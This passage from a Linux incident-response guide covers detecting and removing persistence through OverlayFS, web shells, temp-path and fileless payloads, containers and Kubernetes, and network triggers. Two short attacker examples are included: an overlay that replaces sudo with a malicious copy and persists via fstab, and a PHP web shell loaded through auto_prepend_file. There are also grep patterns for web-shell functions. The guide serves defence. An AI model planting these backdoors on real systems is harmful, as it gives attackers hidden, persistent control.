shotter.v1.overlayfs/snapshots/759/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/759/work 0 0
overlay /var/log overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/757/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/746/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/745/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/744/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/743/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/742/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/741/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/740/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/739/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/738/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/737/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/736/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/735/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/734/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/733/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/732/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/731/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/730/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/728/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/727/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/726/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/724/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/723/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/722/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/721/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/720/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/529/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/528/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/527/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/526/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/525/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/524/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/125/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/759/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/759/work 0 0
tmpfs /dev/null tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
none /proc proc ro,relatime 0 0
overlay /var/log overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/757/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/746/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/745/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/744/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/743/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/742/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/741/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/740/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/739/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/738/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/737/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/736/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/735/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/734/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/733/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/732/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/731/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/730/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/728/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/727/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/726/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/724/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/723/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/722/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/721/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/720/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/529/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/528/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/527/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/526/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/525/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/524/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/125/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/759/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/759/work 0 0
```

This implies that an **overlay filesystem** (`/work/storage/a0cd15e0-370c-4693-83b6-f3c339f98450/log`) was mounted at `/var/log` and then **another overlay filesystem** (`/work/rootfs/tmp/.../mnt`) was mounted at the same point `/var/log`. When accessing the `/var/log` directory on the host, you would access the **top-most (i.e., most recent) mount** at that path indicated by the backtick (`) in the tree under `/var/log`. In Linux, if multiple filesystems are mounted on the same target (e.g., `/var/log`), only the **last one mounted** is visible, it **“shadows”** any previous mounts at the same location. So when we accessed `/var/log`, we only saw the mount for the `/work/rootfs/tmp/.../mnt` overlay.

To get into the first mount point (`/work/storage/3c658cea-88f8-4d44-b590-f661d6185911/log`) we needed to find a way to remove the `/work/rootfs/tmp/.../mnt` directory: we can `unmount` the actual overlay

In this case: `umount /var/log`

When running `umount` on a directory, only the **top-most mount** (the last one mounted on `/var/log`) will be unmounted.

- The underlying mount (the first overlay on `/var/log`) will **still be mounted** and will become visible again.
- So, after the `umount`, you’d still have `/var/log` mounted — just with a different filesystem (the previously shadowed one).

![image.png](img/remediation_overlay2.png)

**Attacker example:**

```bash
# Mount an overlay over /usr/bin replacing sudo with a malicious version
mkdir -p /tmp/.x/upper /tmp/.x/work
mount -t overlay overlay \
  -o lowerdir=/usr/bin,upperdir=/tmp/.x/upper,workdir=/tmp/.x/work \
  /usr/bin
# Write malicious sudo into the upper layer (merged view overrides the original)

cp /tmp/evil_sudo /usr/bin/sudo    # actually writes to /tmp/.x/upper/usr/bin/sudo

# Make the overlay persistent across reboots

cat << 'EOF' >> /etc/fstab
overlay /usr/bin overlay \
  lowerdir=/usr/bin,upperdir=/tmp/.x/upper,workdir=/tmp/.x/work 0 0
EOF
```

In this scenario, integrity checks run directly against `/usr/bin/sudo` may still pass if they inspect only the lower layer or rely on package metadata, while every process on the system sees and executes the attacker‑controlled version from the overlay’s upper layer, effectively hiding artifacts and hijacking execution flow.

---

# Web and Application Persistence

### Why it matters

On internet‑facing Linux servers, web shells and application‑level backdoors are among the most common persistence mechanisms after initial access.
They provide command execution and lateral movement through the web server process, often over HTTPS, without requiring direct SSH or shell access to the host and can be re‑used any time the attacker sends a crafted HTTP request.

### Primary locations

| Path                                   | Notes                                                                 |
|----------------------------------------|-----------------------------------------------------------------------|
| `/var/www/html/`                       | Default Apache / nginx web root                                      |
| `/usr/share/nginx/html/`              | Nginx default on some distributions                                  |
| `/var/www/<virtualhost>/`             | Virtual host document roots (per‑site web roots)                     |
| `/etc/nginx/`, `/etc/apache2/`        | Web server configs; can auto‑include malicious PHP or scripts        |
| `/var/lib/tomcat*/webapps/`           | Java (Tomcat) application deployments (`.jsp`, `.war`)               |
| Application `uploads/`, `tmp/`, `cache/` | Common web shell drop locations via file upload or temp files    |

### Detection

> Objective: identify recently added or modified web‑accessible code, suspicious server configuration and HTTP activity tied to potential web shells.

```bash
# Recently modified web-facing scripts (last 14 days)
find /var/www /usr/share/nginx /usr/lib/cgi-bin /var/lib/tomcat* \
  -type f \( -name '*.php' -o -name '*.phtml' -o -name '*.phar' \
           -o -name '*.cgi' -o -name '*.pl' -o -name '*.py' \
           -o -name '*.jsp' -o -name '*.war' \) \
  -mtime -14 -ls 2>/dev/null
```

- Focus on files in upload or cache directories and any scripts with unusual owners (e.g. `www-data` in `/tmp`, `/var/tmp`, `/dev/shm`).  

```bash
# Common web shell patterns in PHP and configs
grep -RInE 'eval[[:space:]]*\(|base64_decode|shell_exec|passthru|proc_open|system[[:space:]]*\(|auto_prepend_file|auto_append_file' \
  /var/www /etc/php* /etc/apache2 /etc/nginx 2>/dev/null
```

- Look for dynamic `eval`, encoded payloads (`base64_decode`) and `auto_prepend_file`/`auto_append_file` tricks that inject a backdoor into every request.

```bash
# One-line or minimal PHP web shells
grep -rn "<\?php.*system\|<\?php.*exec\|<\?php.*passthru" /var/www/ 2>/dev/null

# Hidden files in web roots
find /var/www -name ".*" -type f 2>/dev/null

# CGI / shell scripts reachable via the web
find /var/www /usr/lib/cgi-bin \
  \( -name "*.sh" -o -name "*.py" -o -name "*.pl" \) 2>/dev/null
```

- Single‑line shells and hidden dotfiles are typical for opportunistic attackers who want a quick but persistent hook.  

```bash
# Files in tmp-like locations owned by web server identities
find /tmp /var/tmp /dev/shm \
  \( -user www-data -o -user nobody \) 2>/dev/null | xargs ls -lah
```

- Web server processes writing to temporary directories may signal dropped tools or staging areas.  

```bash
# Server config modifications – auto-prepend/includes
grep -rE "auto_prepend_file|auto_append_file|php_value.*require|include_path" \
  /etc/php*/ /etc/apache2/ /etc/nginx/ 2>/dev/null
```

- Unexpected `auto_prepend_file` or `include_path` changes can turn a single backdoor file into a global application‑level persistence mechanism.  

```bash
# Web access logs – POSTs to unexpected scripts
grep "POST" /var/log/apache2/access.log /var/log/nginx/access.log 2>/dev/null | \
  grep -vE "wp-login|xmlrpc|contact|api" | tail -50

# Web server process tree for anomalous children
ps -ef --forest | grep -A2 "apache2\|nginx\|php-fpm"
```

- POST requests to unusual `.php`/`.jsp` targets or odd child processes under `apache2`/`nginx`/`php-fpm` often correlate with web shell use.

### Remediation

```bash
# Remove web shell
rm -f /var/www/html/.cache.php

# Restore compromised files from version control or backup
git -C /var/www/html checkout <file>
# or use your deployment pipeline / backup system

# Disable PHP execution in an uploads directory (Apache example)
cat >> /var/www/html/uploads/.htaccess << 'EOF'
php_flag engine off
Options -ExecCGI
RemoveHandler .php .php5 .phtml .shtml
EOF

# Reset sane permissions on restored web root
chown -R www-data:www-data /var/www/html
find /var/www/html -type f -exec chmod 644 {} \;
find /var/www/html -type d -exec chmod 755 {} \;
# Verify that no world‑writable directories remain under the document root unless strictly required. 
```
**Validation**

```bash
# Confirm that web shell patterns are no longer present
find /var/www -name "*.php" -exec grep -l "eval\|base64_decode\|shell_exec" {} \; 2>/dev/null

# Review recent web requests for lingering suspicious activity
grep "POST" /var/log/apache2/access.log /var/log/nginx/access.log 2>/dev/null | tail -50
```

### Attacker example

```bash
# Minimal PHP web shell dropped into uploads
cat > /var/www/html/uploads/.shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
chmod 644 /var/www/html/uploads/.shell.php

# Configuration-based persistence via auto_prepend_file
echo "auto_prepend_file=/var/www/html/uploads/.shell.php" >> /etc/php/8.1/apache2/php.ini
systemctl restart apache2
```

With this setup, any HTTP request handled by Apache’s PHP module will automatically execute `.shell.php` first, giving the attacker a persistent, application‑level foothold even if individual shells are deleted from the main document root.

---

# Temporary Path and Fileless Execution

### Why it matters

`/tmp`, `/dev/shm` and `/var/tmp` are writable by all users, not cleaned on reboot (`/var/tmp`) and backed by RAM (`/dev/shm`). Attackers stage payloads, drop binaries and run scripts from these locations — often as the first thing after gaining access.

These locations are **not standalone persistence** by themselves, but they are almost always the **target** of another persistence mechanism (cron, systemd, shell init, PAM exec). Cleaning them without removing the persistence mechanism that drops them is ineffective.

### Detection

> Objective: identify malicious payloads in temporary directories, fileless executables and processes whose images live in `/tmp`, `/dev/shm`, or `/var/tmp`, then trace them back to their persistence triggers.

```bash
# Hidden (dot) files in temp directories
find /tmp /var/tmp /dev/shm -name ".*" 2>/dev/null
```

- Hidden payloads under `.cache`, `.update`, or similar names are common staging artefacts.  

```bash
# Executable files in temp paths – potential staged malware
find /tmp /var/tmp /dev/shm -xdev -type f -executable -ls 2>/dev/null
```

- Legitimate server binaries should not live in world‑writable locations; treat any executable here as suspicious until proven otherwise. 

```bash
# Recently modified files in temp (last 48 hours)
find /tmp /var/tmp /dev/shm -xdev -type f -mtime -2 -ls 2>/dev/null
```

- Narrow focus to recent activity during the suspected compromise window.  

```bash
# Sockets and pipes in temp – suspicious IPC or C2
find /tmp /var/tmp /dev/shm -xdev \( -type s -o -type p \) -ls 2>/dev/null
```

- Long‑lived sockets/ pipes in temp directories can indicate custom IPC or proxying.  

```bash
# Deleted-but-open executables – fileless execution
find /proc/[0-9]*/exe -lname '* (deleted)' -ls 2>/dev/null

# Open files with link count 0 (fileless malware / deleted binaries)
lsof +L1 2>/dev/null
```

- These reveal binaries that were executed and then deleted from disk, leaving only the in‑memory copy reachable via `/proc/<PID>/exe` or file descriptors.

```bash
# Mount options for temp filesystems – tmpfs, noexec, etc.
for p in /tmp /var/tmp /dev/shm; do
  findmnt "$p" -o TARGET,FSTYPE,OPTIONS 2>/dev/null
done
```

- Understanding whether `/tmp`/`/dev/shm` are `tmpfs` and whether `noexec` is enforced is key for hardening after cleanup.

### Remediation

> Objective: stop processes executing from temporary paths, recover any in‑memory binaries for forensics, remove malicious files and directories and then fix the persistence mechanism that keeps dropping them.

```bash
# Identify and kill processes backed by temp or deleted executables (example flow)
# (Run these BEFORE mass deletion to preserve evidence)
ps auxf | awk '$11 ~ /\/tmp|\/dev\/shm|\/var\/tmp/ {print}'
lsof +L1 2>/dev/null
```

- For each suspicious PID, inspect `/proc/<PID>/exe`, `/proc/<PID>/cmdline` and network connections before killing it. 

```bash
# Terminate processes using specific temp files or mountpoints
fuser -km /tmp/suspicious_file 2>/dev/null
kill -9 <PID>
```

- Use `fuser` and `lsof` to ensure no active process still has the malicious file mapped before removal.  

```bash
# Recover content of deleted-but-open files for forensic analysis
cp /proc/<PID>/fd/<FD> /tmp/recovered_malware
```

- This step preserves the actual payload even when the on‑disk file has been unlinked, allowing hash comparison and deeper analysis.  

```bash
# Remove staged malware from temp directories (do NOT follow symlinks blindly)
rm -f /tmp/.malware
rm -rf /tmp/.hidden_dir/
rm -f /dev/shm/.payload 2>/dev/null
rm -rf /var/tmp/.cache-update/ 2>/dev/null
```

- Be cautious with `rm -rf` in world‑writable directories; confirm paths and consider moving files to an evidence directory instead of immediate deletion.  

```bash
# Optional: harden temp mounts to prevent future execution (after investigation)
# Add or update entries in /etc/fstab based on your distro and storage layout:
# tmpfs /tmp     tmpfs defaults,noexec,nosuid,nodev,size=2G   0 0
# tmpfs /dev/shm tmpfs defaults,noexec,nosuid,nodev,size=512M 0 0
# (Or equivalent ext4/xfs options for /var/tmp)

mount -o remount,noexec,nosuid,nodev /tmp
mount -o remount,noexec,nosuid,nodev /dev/shm
mount -o remount,noexec,nosuid,nodev /var/tmp 2>/dev/null

# Verify options
findmnt -o TARGET,OPTIONS /tmp /dev/shm /var/tmp
```

- Enforcing `noexec,nosuid,nodev` on temporary filesystems blocks most post‑exploit payloads from running directly from these locations. 

Finally, remember that `/tmp`, `/dev/shm` and `/var/tmp` are usually **symptoms** of another persistence mechanism, not the root cause:

- After cleaning and hardening temp directories, trace back **how** those files appeared there — cron jobs, systemd units, rc.local, web shells, PAM `pam_exec`, or OverlayFS overlays — and eradicate those persistence layers first, or the payloads will simply be re‑dropped.

---

# Container and Orchestration

## Why it matters

On modern Linux servers, persistent access often lives inside containers and orchestration platforms (Docker, containerd, Podman, CRI‑O, Kubernetes) rather than directly on the host.
Attackers can deploy backdoor containers, privileged DaemonSets, CronJobs, or rogue RBAC objects that survive pod restarts, node reboots and even host reimaging, giving them a durable foothold at the cluster or runtime level.

---

### Primary locations

| Surface                              | Notes                                                                 |
|-------------------------------------|-----------------------------------------------------------------------|
| Docker / containerd / Podman / CRI‑O | Container runtimes, local images and containers on Linux hosts      |
| systemd units                        | Service units that start containers or runtimes at boot              |
| Kubernetes pods / Deployments       | Backdoor containers and long‑lived workloads                         |
| DaemonSets / CronJobs               | Cluster‑wide or scheduled persistence across nodes                   |
| RBAC objects (ClusterRoleBindings, ServiceAccounts) | Privilege‑granting identities that outlive pods       |
| Admission webhooks                  | Mutating/validating webhooks that can inject or gate future workloads |

### Detection

> Objective: enumerate container runtimes and Kubernetes workloads, identify suspicious units and RBAC and correlate them with host processes and network activity.

#### 1. Container runtimes on the host

```bash
# Docker containers (running and stopped)
docker ps -a 2>/dev/null

# Recent Docker events (creation, start/stop, image pulls)
docker events --since 24h 2>/dev/null

# Podman containers
podman ps -a 2>/dev/null

# CRI-O / generic CRI containers
crictl ps -a 2>/dev/null
```

- Look for containers with unexpected names, images, or restart behaviour (e.g. mining images, generic “system-monitor” containers running privileged).  

```bash
# Runtime configuration – ownership, permissions, content
find /etc/docker /etc/containerd /etc/containers -type f -ls 2>/dev/null
```

- Check for modified daemon configs, custom registries, or unauthorized `--privileged` / `--host` options in unit files or JSON configs. 

```bash
# systemd units related to containers and pods
find /etc/systemd /usr/lib/systemd ~/.config/systemd \
  -type f \( -iname '*docker*' -o -iname '*container*' -o -iname '*pod*' \) 2>/dev/null
```

- Identify services that automatically start runtimes or specific containers at boot (e.g. `docker.service`, `containerd.service`, or custom units wrapping `docker run`).  

#### 2. Kubernetes workloads and RBAC

```bash
# Cluster workloads – pods, DaemonSets, Deployments, CronJobs
kubectl get pods,daemonsets,deployments,cronjobs -A -o wide 2>/dev/null
```

- Flag workloads that run as privileged, use `hostNetwork`/`hostPID`, or mount `hostPath` volumes pointing at `/`, `/var/log`, `/etc/kubernetes`, or other sensitive directories.  

```bash
# Admission webhooks – potential injection points
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml 2>/dev/null
```

- Inspect webhook configurations for external endpoints, untrusted images, or rules that match broad sets of namespaces/resources; attackers can use these to inject backdoor containers into future deployments.

Additional scoping:

- Dump `kubectl get clusterrolebindings,rolebindings,serviceaccounts -A -o wide` to look for suspicious RBAC objects (e.g. unexpected `cluster-admin` bindings, backdoor ServiceAccounts in `kube-system`).
- Correlate pods with host processes (`ps auxf`, `crictl ps -a`) and network connections to see which workloads are generating outbound C2 or mining traffic.  

### Remediation

> Objective: contain and remove malicious containers and Kubernetes workloads, clean up backdoor RBAC and webhook configurations, then restore legitimate services from version‑controlled manifests.

#### 1. Contain suspicious containers

```bash
# Stop and remove suspicious Docker/Podman containers
docker stop <container_id> 2>/dev/null
docker rm <container_id> 2>/dev/null

podman stop <container_id> 2>/dev/null
podman rm <container_id> 2>/dev/null
```

- Before removal, capture container metadata (`docker inspect`, `podman inspect`), image IDs and `docker logs`/`crictl logs` output for forensics.  

#### 2. Remove malicious Kubernetes workloads and webhooks

```bash
# Remove suspicious Kubernetes workloads
kubectl delete pod <pod_name> -n <namespace>
kubectl delete daemonset <daemonset_name> -n <namespace>
kubectl delete deployment <deployment_name> -n <namespace>
kubectl delete cronjob <cronjob_name> -n <namespace>

# Remove suspicious admission webhooks
kubectl delete mutatingwebhookconfiguration <webhook_name>
kubectl delete validatingwebhookconfiguration <webhook_name>
```

- For DaemonSets and CronJobs used as persistence, ensure you also remove any backing ConfigMaps/Secrets that hold payloads or C2 configuration.

#### 3. Clean up backdoor RBAC and runtime configuration

```bash
# Example: remove a backdoor ClusterRoleBinding
kubectl delete clusterrolebinding backdoor-admin

# Remove rogue ServiceAccounts if present
kubectl delete serviceaccount backdoor-sa -n kube-system
```

- Audit all `ClusterRoleBindings` and high‑privilege roles for unexpected subjects (users, groups, ServiceAccounts) and remove those not tied to known applications or platform components. 

```bash
# Inspect and fix container runtime configuration and systemd units
find /etc/docker /etc/containerd /etc/containers -type f -ls 2>/dev/null
systemctl cat docker containerd 2>/dev/null
```

- Restore daemon configs and custom units from trusted baselines, removing any `ExecStart` or `Environment=` lines that start attacker‑controlled containers at boot.  

#### 4. Restore legitimate workloads and harden the cluster

- Re‑deploy legitimate applications from version‑controlled manifests or IaC (Helm, Kustomize, Terraform), ensuring images come from trusted registries and are pinned to known‑good digests. 
- Apply security controls:
  - Least‑privilege RBAC (no generic `cluster-admin` bindings for app ServiceAccounts).  
  - Pod security controls (Pod Security Admission, OPA/Gatekeeper policies) to block privileged containers and unsafe `hostPath` mounts.
  - Network Policies to restrict pod‑to‑pod and pod‑to‑internet communication.  

Verification:

```bash
# Confirm suspicious workloads are gone
kubectl get pods,daemonsets,deployments,cronjobs -A -o wide 2>/dev/null | grep <suspicious_name> || echo "[OK] workload removed"

# Review logs for remaining anomalies
kubectl logs <pod_name> -n <namespace> --since=1h
```

- Combine Kubernetes audit logs with runtime/container logs and host telemetry to ensure that no new backdoor containers, DaemonSets, or RBAC changes are being created after cleanup.  

---

# Network level containment

## Why it matters

Network‑level containment does not remove persistence, but it can quickly cut off attacker C2, lateral movement and data exfiltration while you collect evidence and eradicate the root cause. 
On Linux, containment often touches firewall rules, dispatcher scripts, hardware triggers (udev) and D‑Bus activation policies, which themselves can be abused as execution and persistence surfaces if misconfigured.

---

## Network-level controls & triggers

### Primary locations

| Path / Surface                              | Notes                                                           |
|--------------------------------------------|-----------------------------------------------------------------|
| `ss`, `ip route`, `ip rule`                | Active network connections and routing tables                   |
| `nftables`, `iptables`, `firewalld`        | Host firewall policies and rulesets                             |
| `/etc/NetworkManager/dispatcher.d/`        | NetworkManager dispatcher scripts (run on interface events)     |
| `/etc/NetworkManager/`                     | NetworkManager configs, connection profiles                     |
| `/etc/udev/rules.d/`, `/lib/udev/rules.d/` | udev rules that trigger commands on hardware events             |
| `/etc/dbus-1/`, `/usr/share/dbus-1/`       | D‑Bus service activation and policies                           |
| `getcap -r /`                              | Global Linux file capabilities (network / privilege‑related)    |
| File xattrs (`security.*`, `user.*`)       | SELinux, IMA and custom attributes on key binaries/configs     |

### Detection

> Objective: map current network activity, discover scriptable triggers tied to network/hardware/D‑Bus events and locate rules that may be abused for persistence or C2.

```bash
# TCP/UDP connections – map egress and potential reverse shells
ss -tpna
```

- Look for long‑lived outbound connections from unexpected processes, especially to untrusted IPs and ports.  

```bash
# Routing and policy rules – detect unusual routes or source-based rules
ip route
ip rule
```

- Identify extra routes to attacker infrastructure or policy rules that divert traffic through unexpected gateways.  

```bash
# nftables ruleset – active firewall policy
nft list ruleset 2>/dev/null

# iptables rules – legacy or coexisting firewall policy
iptables-save 2>/dev/null

# firewalld configuration – zones and rich rules
firewall-cmd --list-all 2>/dev/null
```

- Check for permissive rules or explicit allows to attacker IP ranges and confirm which firewall stack is effectively in control.  

```bash
# NetworkManager configuration – ownership and content
find /etc/NetworkManager -type f -ls 2>/dev/null

# NetworkManager dispatcher scripts – run on interface state changes
find /etc/NetworkManager/dispatcher.d -type f -ls \
  -exec sed -n '1,160p' {} \; 2>/dev/null
```

- Dispatcher scripts can start backdoor tunnels or reconfigure routes whenever an interface comes up/down.  

```bash
# udev rules – hardware-triggered execution
find /etc/udev/rules.d /lib/udev/rules.d -type f -ls 2>/dev/null

# Commands executed from udev rules (RUN+=)
grep -RInE 'RUN\+?=' /etc/udev/rules.d /lib/udev/rules.d 2>/dev/null
```

- Malicious `RUN+=` entries can launch payloads when specific devices appear or events fire.  

```bash
# D-Bus configuration – activation and service mapping
find /etc/dbus-1 /usr/share/dbus-1 -type f -ls 2>/dev/null

# Commands/services triggered via D-Bus
grep -RInE 'Exec=|SystemdService=' /etc/dbus-1 /usr/share/dbus-1 2>/dev/null
```

- D‑Bus service files can map bus messages to systemd services or executables, providing indirect execution paths.  

```bash
# Global capabilities – non-standard privilege on files
getcap -r / 2>/dev/null
```

- Capabilities like `cap_net_admin`, `cap_net_raw`, or `cap_setuid` on unexpected binaries can support stealthy network operations or privilege escalation.  

```bash
# File attributes – SELinux, IMA and custom xattrs on key paths
find /etc /usr/local /opt -xdev -type f \
  -exec getfattr -n security.ima -n security.selinux -n user.* {} + 2>/dev/null
```

- Review attributes for tampering or unexpected trust labels on network‑critical components (firewall scripts, proxies, daemons).  

### Remediation (Containment)

> Objective: quickly block attacker connectivity, remove malicious network‑triggered scripts/rules and restart affected services after forensic collection. These steps **contain** activity but do not, by themselves, remove underlying persistence.

```bash
# Remove a malicious NetworkManager dispatcher script
rm /etc/NetworkManager/dispatcher.d/malicious.sh

# Remove a malicious udev rule
rm /etc/udev/rules.d/99-malicious.rules
```

- Before deletion, copy files to an evidence directory, record hashes, timestamps and owners, then remove them from active paths.  

```bash
# Kill specific connections (use with caution – may affect legitimate traffic)
ss -K dst <ATTACKER_IP> dport = <PORT>
```

- Use this to immediately tear down known C2 channels while preserving overall connectivity.  

```bash
# Block attacker IP with iptables
iptables -I INPUT 1 -s <ATTACKER_IP> -j DROP
iptables -I OUTPUT 1 -d <ATTACKER_IP> -j DROP

# Block attacker IP with nftables
nft add rule inet filter input ip saddr <ATTACKER_IP> drop
nft add rule inet filter output ip daddr <ATTACKER_IP> drop

# Persistent block via firewalld
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="<ATTACKER_IP>" drop'
firewall-cmd --reload
```

- Choose the firewall stack your host actually uses (nftables, iptables, or firewalld) and apply consistent rules there; document any emergency changes for later tidy‑up.

```bash
# Kill processes after network containment
kill <PID>
kill -9 <PID>                 # force if SIGTERM is ignored
pkill -f "<process_name_pattern>"
killall <process_name>
```

- Kill known malicious processes only after you’ve captured memory/artifacts as needed for forensics.  

```bash
# Restart affected services to apply clean configs
systemctl restart NetworkManager
systemctl restart systemd-udevd
systemctl restart dbus
```

- Restarting services ensures they re‑read configuration without the removed scripts or rules; monitor logs to confirm they come back clean.  

Verification:

```bash
# Confirm malicious dispatcher scripts and udev rules are gone
find /etc/NetworkManager/dispatcher.d -name "*.sh" -exec grep -l "malicious" {} \; 2>/dev/null
find /etc/udev/rules.d -name "*.rules" -exec grep -l "malicious" {} \; 2>/dev/null

# Confirm attacker connections are blocked
ss -tpna | grep <ATTACKER_IP> || echo "[OK] no active connections to attacker"

# Confirm firewall rules referencing attacker IP are present
iptables -L -n | grep <ATTACKER_IP>
nft list ruleset | grep <ATTACKER_IP>
firewall-cmd --list-all 2>/dev/null | grep <ATTACKER_IP>
```

- Once containment is in place, continue with deeper eradication work: remove the persistence mechanisms that spawn these processes and repair or harden network‑triggered execution paths (dispatcher scripts, udev, D‑Bus, systemd units) so they cannot be abused again.
 
